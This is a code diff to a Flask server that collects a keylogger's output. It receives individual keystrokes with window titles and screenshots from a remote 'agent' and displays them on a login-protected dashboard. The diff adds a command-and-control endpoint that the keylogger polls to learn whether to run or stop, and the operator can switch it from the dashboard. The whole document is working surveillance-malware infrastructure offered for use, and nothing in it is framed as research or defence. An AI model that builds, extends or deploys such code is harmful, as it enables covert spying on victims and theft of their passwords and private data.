@@ -9,10 +9,13 @@ app.secret_key = os.environ.get("SECRET_KEY", "change-this-in-production")
 
 # ── In-memory stores ──────────────────────────
 MAX_EVENTS      = 1000
-MAX_SCREENSHOTS = 20   # keep last 20 screenshots in memory
+MAX_SCREENSHOTS = 20
 
 events      = deque(maxlen=MAX_EVENTS)
 screenshots = deque(maxlen=MAX_SCREENSHOTS)
+
+# Agent state — "run" or "stop"
+agent_command = "run"
 
 # ── Auth ──────────────────────────────────────
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "admin123")
@@ -44,11 +47,9 @@ def logout():
 
 @app.route("/log", methods=["POST"])
 def receive_log():
-    """Receive a single keystroke from the agent."""
     data = request.get_json(silent=True)
     if not data:
         return jsonify({"error": "Invalid JSON"}), 400
-
     entry = {
         "timestamp":   data.get("timestamp", datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")),
         "window":      data.get("window", "Unknown"),
@@ -61,18 +62,36 @@ def receive_log():
 
 @app.route("/screenshot", methods=["POST"])
 def receive_screenshot():
-    """Receive a base64-encoded screenshot from the agent."""
     data = request.get_json(silent=True)
     if not data or "image" not in data:
         return jsonify({"error": "No image"}), 400
-
     entry = {
         "timestamp": data.get("timestamp", datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")),
         "window":    data.get("window", "Unknown"),
-        "image":     data["image"],   # base64 JPEG string
+        "image":     data["image"],
     }
     screenshots.appendleft(entry)
     return jsonify({"status": "ok"}), 200
+
+
+@app.route("/command", methods=["GET"])
+def get_command():
+    """Keylogger polls this to check if it should run or stop."""
+    return jsonify({"command": agent_command})
+
+
+@app.route("/command", methods=["POST"])
+@login_required
+def set_command():
+    """Dashboard sets the command — run or stop."""
+    global agent_command
+    data = request.get_json(silent=True)
+    cmd  = data.get("command") if data else None
+    if cmd not in ("run", "stop"):
+        return jsonify({"error": "Invalid command"}), 400
+    agent_command = cmd
+    return jsonify({"status": "ok", "command": agent_command})
+
 
 # ── Dashboard ─────────────────────────────────
 
@@ -98,8 +117,7 @@ def api_events():
 @app.route("/api/screenshots")
 @login_required
 def api_screenshots():
-    """Return the last N screenshots (base64)."""
-    limit = int(request.args.get("limit", 6))
+    limit = int(request.args.get("limit", 20))
     return jsonify({
         "screenshots": list(screenshots)[:limit],
         "total":       len(screenshots),
@@ -118,6 +136,7 @@ def api_stats():
         "total_keystrokes":  len(all_ev),
         "total_screenshots": len(screenshots),
         "top_windows":       [{"window": w, "count": c} for w, c in top],
+        "agent_command":     agent_command,
     })
 
 @app.route("/api/clear", methods=["POST"])
